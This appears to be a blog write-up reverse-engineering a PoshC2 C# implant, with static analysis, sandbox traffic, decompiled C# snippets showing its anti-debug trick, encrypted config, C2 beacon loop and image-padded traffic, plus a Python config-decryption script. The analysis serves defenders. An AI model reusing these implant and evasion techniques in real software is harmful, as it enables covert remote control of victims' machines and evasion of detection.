---
title: "Dropper-cs.exe analysis"
date: 2025-11-23
draft: false
summary: "`dropper_cs.exe` — PoshC2 C# implant. AES-encrypted config, HTTPS beacon to `192.168.248.128`, fileless in-memory execution, anti-debug via divide-by-zero."
tags:
  - Malware Analysis
  - Reverse Engineering
  - Windows
  - PE
  - .NET
  - dnspy
platform: Malware Analysis
---


### <span style="color:lightblue">TL;DR</span>

`dropper_cs.exe` is a **PoshC2 C# implant (stager)** that establishes a persistent encrypted C2 channel over HTTPS.

On execution the sample immediately hides its console window and uses a deliberate divide-by-zero exception as an anti-debug technique — real execution flow lives inside the catch block, invisible to a debugger. An AES-encrypted C2 configuration is embedded directly in the binary as a reversed base64 string, decrypted at runtime to reveal the C2 address, beacon interval, session key, and URI pattern.

The implant contacts `192.168.248.128:443` within 1.3 seconds of startup, sending an AES-encrypted system fingerprint (username, domain, PID, architecture) disguised as a `SessionID` cookie. Outbound data is padded with real image bytes to evade network inspection. All communication is encrypted with AES-CBC and SSL validation is disabled to allow self-signed certificates.

Once staging completes, the implant enters an indefinite beacon loop (`KillDate: 2999-01-01`), polling the C2 every 5 seconds ±20% jitter for commands. It supports 13+ commands including in-memory assembly execution, live reconfiguration, modular payload loading via `Stage2-Core.exe`, and named pipe communication for lateral movement. All operations are fileless — nothing is written to disk.
```
SHA256      8E5EEB667A962DBEE803572F951D08A65C67A42ECB6D6EAF8EBAAF3681E26154
Family      PoshC2 — C# implant
C2          https://192.168.248.128
URI         /vfe01s/1/vsopts.js/?c
BeaconSleep 5s ± 20% jitter
KillDate    2999-01-01
Encryption  AES-CBC, 256-bit key
```

### <span style="color:red">initial analysis</span>
```console
$ file *
dropper_cs.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 Mono/.Net assembly, 3 sections

```
SHA256: 8E5EEB667A962DBEE803572F951D08A65C67A42ECB6D6EAF8EBAAF3681E26154
#### libraries
Confirmed that is .NET executable by seen a huge amount of `mscoree.dl` (Microsoft .NET Runtime Execution Engine)
![alt text](image.png)

#### imports
```
VirtualProtect                              KERNEL32.dll
GetCurrentThread                            KERNEL32.dll
TerminateThread                             KERNEL32.dll
GetConsoleWindow                            KERNEL32.dll
```
\- `VirtualProtect + PAGE_EXECUTE_READWRITE` field: marks memory regions as executable, shellcode injection technique  
\- `GetConsoleWindow + ShowWindow(SW_HIDE)`: hides console window from user  

```
Load                                        mscoree.dll (runtime)
CreateDomain, DoCallBack, Unload            mscoree.dll (runtime)
RunEphemeralAssembly, ActivateLoader        mscoree.dll (runtime)
RunTempAppDomain, RunAssembly               mscoree.dll (runtime)
```
\- loads and executes assemblies directly from bytes, never touching disk


```
Beacon, BeaconSleepMillis, Jitter           mscoree.dll (C2 logic)
GenerateUri, StageUrl, URIs                 mscoree.dll (C2 logic)
GetCommands, SendTaskOutputString           mscoree.dll (C2 logic)
DownloadString, UploadData                  System.Net (WebClient)
```
\- `beacon loop`: sleep with jitter -> contact C2 -> receive commands -> send output  
\- `GenerateUri`: randomizes request URLs to evade pattern-based detection  

```
ProxyUrl, ProxyUser, ProxyPassword          mscoree.dll (config)
UserAgent, HttpReferrer                     mscoree.dll (config)
set_ServerCertificateValidationCallback     System.Net
AllowUntrustedCertificates                  mscoree.dll
```

\- custom User-Agent, Referrer, proxy support  
\- SSL certificate validation disabled: allows self-signed C2 certs, MITM-friendly  

```
PadWithImageData, ImageDataObfuscator       mscoree.dll (C2 logic)
Images, ExtractImages                       mscoree.dll (config)
```
\- steganography: C2 traffic disguised as image data  

```
RijndaelManaged, AesCryptoServiceProvider   System.Security.Cryptography
Encrypt, Decrypt, CreateEncryptor           mscoree.dll
Key, GenerateIV                             mscoree.dll
```
\- `AES` encryption of all C2 traffic  


```
GetEnvironmentalInfo, GetCurrentProcess     mscoree.dll / System.Diagnostics
get_UserName, get_UserDomainName            System
IsHighIntegrity, WindowsPrincipal.IsInRole  System.Security.Principal
GetEnvironmentVariable                      System
```
\- system reconnaissance: username, domain, process name, PID   
\- IsHighIntegrity: checks for admin/SYSTEM privileges  


#### strings
```
PAGE_EXECUTE_READWRITE        
SW_HIDE                        
MULTI_COMMAND_PREFIX          
COMMAND_SEPARATOR             
```
\- `PAGE_EXECUTE_READWRITE` - VirtualProtect constant, confirms shellcode injection capability  
\- `SW_HIDE` — hides console window on startup  
\- `MULTI_COMMAND_PREFIX` / `COMMAND_SEPARATOR` — supports batched command execution from C2


```
reversedBase64Config  
!d-3dion@LD!-d                 hardcoded key (used in PoshC2) 
==wFR4yT0nuXyBLNH...           reversed base64 ~600 chars (offset 0x04B25DE9)
sI1bBV0hgqeoBBbXa/KqQx8...     base64 (offset 0x04B2629C)
```
\- large reversed  base64 blob (~600 chars) — **embedded encrypted C2 configuration**  


```
run-exe                         command
run-dll                         command
run-temp-appdomain              command
update-config                   command
load-module                     command
run-dll-background              command
run-exe-background              command
run-assembly-background         command
set-delegates                   command
download-file                   command
run-assembly                    command
beacon                          command
exit                            command
multicmd                        command prefix
```
\- full **C2 command dispatcher** confirmed  
\- `run-assembly` / `run-exe` / `run-dll` — arbitrary in-memory code execution  
\- `run-*-background` — background task execution in separate threads   
\- `load-module` — dynamic loading of new modules pushed from C2  
\- `download-file` — exfiltration or additional staging  
\- `update-config` — **live reconfiguration**   


```
{0}/{1}{2}/?{3}                 URL format string
SessionID={0}                   cookie/param
Host                           
User-Agent                     
Referer                        
```
\- URL template `{0}/{1}{2}/?{3}` — randomized C2 url generation to evade pattern detection  
\- `SessionID` in cookie — mimics legitimate web session to blend into normal traffic  

**Overall conclusion:**
Strings confirm and extend the picture from imports — this is a **PoshC2 C# implant (Stager/Dropper)**:

- **Two-stage architecture**: this binary is the stager, loads `Stage2-Core.exe` entirely in memory
- **Embedded encrypted config**: large base64 blob with C2 parameters, decoded via reverse + AES
- **Full command loop**: 13+ commands including live config update and modular payload loading
- **Traffic masking**: SessionID cookie, custom HTTP headers, randomized URL patterns
- **Operational security**: KillDate enforced, temporary AppDomains, all operations fileless

#### running in Sandbox
Ran ANY.RUN sandbox with Fake Net enabled.
Sample sends 2 HTTP requests over ~40 seconds (beacon interval).
![alt text](image1.png)
\- url pattern `/vfe01s/1/vsopts.js/?c` directly matches hardcoded format string `{0}/{1}{2}/?{3}`

HTTP Request:
```
URL          /vfe01s/1/vsopts.js/?c
Protocol     HTTP/1.1
Method       GET
Cookie       SessionID=nINTTfojq1v9MITeQO+JRekWX1/+Nqc6/BMwBNX6MaW6Wr
             PdAzMWsLM/mYMLtMCokYOzh0jpmBMmDUCxfkytXVuMqxpQ/IECzNPp
             KiI2ia/3OdtLwM8Qjk6mdnBJyza
User-Agent   Mozilla/5.0 (Windows NT 10.0; Win64; x64)
             AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Host         192.168.248.128
Connection   Keep-Alive
```
\- uses legitimate Chrome User-Agent
\- this is the **initial beacon fingerprint** sent to C2 on first check-in  


![alt text](image2.png)
\- outbound TCP to `192.168.248.128:443` initiated **1288ms after process start** 
\- traffic over port 443 (HTTPS)


### <span style="color:red">reversing in DNSpy</span>

Started analysis from `Main()` function, which calls `Sharp()`.
```c#
public static void Main()
{
    Program.Sharp(0L, 0L);
}
```

#### anti-analysis
The `Sharp()` function starts by hiding the console window.
```c#
public static void Sharp(long callbackFunc = 0L, long baseAddress = 0L)
{
    Internals.ShowWindow(Internals.GetConsoleWindow(), 0);
    byte[] array = new byte[0];
...[snip]...
```

Next it performs an anti-debug technique using a throw/catch exception. if the debugger is **not** attached, it triggers a divide-by-zero exception, which is caught by the `catch (Exception)` block where the main code begins execution. if the debugger **is** attached — no exception is thrown and the implant proceeds with an empty config, effectively disabling itself.
```c#
try
{
    IntPtr intPtr = new IntPtr(0L);
    long num;
    if (Debugger.IsAttached)
    {
        num = baseAddress;
    }
    else
    {
        num = baseAddress / intPtr.ToInt64(); // intentional divide-by-zero
    }
    array = Encoding.BigEndianUnicode.GetBytes(num.ToString());
}
catch (Exception)
...[snip]...
```

Inside the catch block, the `Config()` constructor is initialized with hardcoded encrypted data.
```c#
try
{
...[snip]...
    Config config = new Config("==wFR4yT0nuXyBLNHGAHcm51H/B3CjLNxlp6/k3YhokMiGKy4cWkNtmW6Werm1nHWI4yPTbEchk4pGl54J4YH+d43Edan+kOVjPF/wMkpp7Jc3uXiBjCNEJSQNlNHL6ouI06gjISjsdqPTcLLN2JKAxYLSDtAUkarsF6AVXWknO4DYtUCO2xvwQvf43y4cdLNpuDhVUZv1P3emAcfl1EEA83qYGqIxiJsXvaVR/Nxgrl2/jqVO9XtBEMRkJgP/3JrTPgxp3P3kqIu0/WZvp7YApAXQTO8HRir077rNlcXOxqo1/jVsMTSSk3yiIv7nvmQfyMM/fCTp3o4Oeo6Bq/8/A3RH6gPB4sqNXhU4kVSQerYkP4dSKrKR+jfDYfKqr26TQuduOTcEI9E3tVvZXvZaWqDVUtvFdLviPO89B4Uzs5Wz9S709m91DLFgU0PDlubKyTPmR1qyM4JclfJbW9a60YdYsIm346hq38+Y2IHroOJUhmufrnXAHeX0yTmGq8nNGDpnQm8DpGm4At4MjdSgK0YW6HRWRYB4yoU07cv4hvZPvhXCChNk+fl4i9RDwcj7YtrY7fR4Nw+1us/nE6fsfM", "sI1bBV0hgqeoBBbXa/KqQx8FSWe/jqKFF9TBxehGxxc=");
    Program.Init(config);
...[snip]...
}
catch (Exception ex)
```

`Config(config, key)` receives the encrypted config as a reversed base64 string. the string is first reversed, then passed along with the key to `Decrypt()`. the decrypted result contains another base64 string which is decoded again, producing plaintext that is passed to `ParseConfigString()`.
![alt text](image4.png)

`Decrypt()` extracts the first 16 bytes from the decrypted data as the IV, then constructs the cipher via `CreateAlgorithm(key, iv)`.
![alt text](image5.png)

`CreateAlgorithm()` implements AES-CBC with a 128-bit block size and 256-bit key.
![alt text](image6.png)

To extract the plaintext config, a Python script was written to replicate the C# decryption logic:
\- reverse the base64 string
\- decode base64 → ciphertext bytes
\- first 16 bytes = IV, remaining bytes = ciphertext
\- decode key from base64
\- decrypt using AES-CBC
\- decode result as base64 once more to get plaintext config
```python
from Crypto.Cipher import AES
import base64

rev_b64 = ("==wFR4yT0nuXyBL...fsfM")
b64_key = "sI1bBV0hgqeoBBbXa/KqQx8FSWe/jqKFF9TBxehGxxc="

b64 = rev_b64[::-1]
ciphertext = base64.b64decode(b64)

iv = ciphertext[:16]
ct = ciphertext[16:]

key = base64.b64decode(b64_key)

cipher = AES.new(key, AES.MODE_CBC, iv)
dec = cipher.decrypt(ct)

dec = dec.rstrip(b'\x00')
text = dec.decode('utf-8')
raw = base64.b64decode(text)
config = raw.decode('utf-8')

print("\n+-------------------------+")
print(config)
print("+--------------------------------+")
```

#### config decryption result

Running the decryption script against the embedded config produces the following plaintext:
```
true;30;60;;;;;TW96aWxsYS81LjAg...;;2999-01-01;1;https://192.168.248.128,;https://192.168.248.128,;;;/vfe01s/1/vsopts.js/?c;;5s;0.2;Qqz6czYCfkrmlba4dF16YLO1vJq13piIlFlN+5o06/g=;;;
```

parsed config fields:
```
RetriesEnabled        true
RetryLimit            30
StageWaitTimeMillis   60
UserAgent             Mozilla/5.0 (Windows NT 10.0; Win64; x64)
                      AppleWebKit/537.36 Chrome/80.0.3987.122 Safari/537.36
                      (base64 decoded from TW96aWxsYS81LjAg...)
KillDate              2999-01-01
ImplantId             1
StageUrl              https://192.168.248.128
BeaconCommsUrl        https://192.168.248.128
URI                   /vfe01s/1/vsopts.js/?c
BeaconSleep           5s
Jitter                0.2  (20%)
Key                   Qqz6czYCfkrmlba4dF16YLO1vJq13piIlFlN+5o06/g=
```
- `KillDate: 2999-01-01` — effectively disabled, implant runs indefinitely  
- `BeaconSleep: 5s` with `Jitter: 0.2` — beacon interval is 5 seconds ±20%, confirms ~40s gap observed in sandbox was due to fake.net retry backoff, not the configured sleep  
- `UserAgent` field matches exactly the User-Agent observed in HTTP request during sandbox analysis  
- `Key` — AES session key used for encrypting beacon communications (separate from config decryption key)  
- `StageUrl` and `BeaconCommsUrl` both point to `192.168.248.128` — single C2 server for both staging and ongoing communication  
- `URI: /vfe01s/1/vsopts.js/?c` — confirms the exact path observed in sandbox network capture  


#### Init() → Stage() → CommandLoop() analysis

`Init()` — main execution entry point, called after config decryption and validation checks pass. It calls `Stage()` for initial C2 check-in, then enters `CommandLoop()` indefinitely
```csharp
private static void Init(Config config)
{
    IComms comms = new HttpComms(config);
    Program._sendData = new Action<string, byte[]>(comms.SendTaskOutputBytes);
    Program.Stage(config, comms);
    Program.CommandLoop(config, comms);
}
```

`CommandLoop()` — main beacon loop, runs until KillDate.
```csharp
while (!(DateTime.ParseExact(config.KillDate, "yyyy-MM-dd", ...) < DateTime.Now))
```
\- loop continues as long as current date is before KillDate  
\- `KillDate: 2999-01-01` extracted from config — implant runs indefinitely  

**task parsing:**
```csharp
string text2 = text.Substring(0, 5);  // first 5 chars = task ID
string command = text.Substring(5);    // remainder = command string
```
\- every command received from C2 is prefixed with a 5-character task ID   
\- task ID is used when sending output back to C2 to correlate responses  

**batch command support:**
```csharp
commands.Replace("multicmd", "").Split(new string[]{"!d-3dion@LD!-d"}, ...)
```
\- `multicmd` prefix signals multiple commands in a single response
\- `!d-3dion@LD!-d` is the hardcoded delimiter separating individual commands
\- both strings were identified during static strings analysis

**command dispatcher:**
```
exit                     -> dispose comms, terminate loop
run-temp-appdomain       -> execute assembly in isolated temporary AppDomain
update-config            -> live reconfiguration via config.Refresh()
load-module              -> load Stage2-Core assembly into memory, wire delegates
run-dll/exe-background   -> execute assembly in background thread
run-dll/exe              -> execute assembly in current thread
run-assembly-background  -> run ephemeral assembly in background thread
run-assembly             -> run ephemeral assembly in current thread
set-delegates            -> rewire Stage2-Core function pointers
download-file            -> execute via RunCoreAssembly, send output to C2
beacon                   -> update sleep interval via SLEEP_REGEX parser
<unknown command>        -> fallback: passed to RunCoreAssembly (all custom modules)
```

#### C2 communication layer

Constructor initializes the steganography module `ImageDataObfuscator` for hiding C2 data inside image payloads, and disables SSL validation via `AllowUntrustedCertificates()` to allow self-signed certificates on the C2 server.
```csharp
internal HttpComms(Config config)
{
    this._config = config;
    this._imageDataObfuscator = new HttpComms.ImageDataObfuscator(config);
    Utils.AllowUntrustedCertificates();
}
```

`Stage()` — initial C2 check-in. Environmental fingerprint is AES-encrypted and sent as `SessionID` cookie, confirmed by sandbox HTTP capture. C2 URL is constructed from `StageCommsChannels` key + `StageUrl` from decrypted config.
```csharp
string cookie = Encryption.Encrypt(this._config.Key, environmentalInfo, false);
string address = text + this._config.StageUrl;
WebClient webClient = this.GetWebClient(cookie, hostHeader);
string base64EncodedCiphertext = webClient.DownloadString(address);
```

#### Steganographic payload padding

`PadWithImageData()` disguises outbound C2 data by prepending a real image followed by random noise, making the payload appear as a legitimate image file to network inspection tools.
```csharp
internal byte[] PadWithImageData(byte[] data)
{
    int num = data.Length + 1500;
    string s = this._config.Images[new Random().Next(0, this._config.Images.Count)];
    byte[] array = Convert.FromBase64String(s);
    byte[] bytes = Encoding.UTF8.GetBytes(HttpComms.ImageDataObfuscator.RandomString(1500 - array.Length));
    byte[] array2 = new byte[num];
    Array.Copy(array, 0, array2, 0, array.Length);
    Array.Copy(bytes, 0, array2, array.Length, bytes.Length);
    Array.Copy(data, 0, array2, array.Length + bytes.Length, data.Length);
    return array2;
}
```

Final payload structure is `[image bytes] + [random noise] + [actual data]`, total size is always `data.Length + 1500` bytes. Image is randomly selected from the `Images` list in decrypted config and base64-decoded. Noise fills the remaining space up to the 1500-byte header using `RandomString()`.

`RandomString()` generates noise by sampling random characters from a fixed charset, producing unpredictable but low-entropy padding.
```csharp
private static string RandomString(int length)
{
    return new string((from s in Enumerable.Repeat<string>("...................@..........................Tyscf", length)
    select s[Program.RANDOM.Next(s.Length)]).ToArray<char>());
}
```

The fixed charset `"...................@..........................Tyscf"` was visible as a raw string in the strings analysis at offset `0x04B25D81`.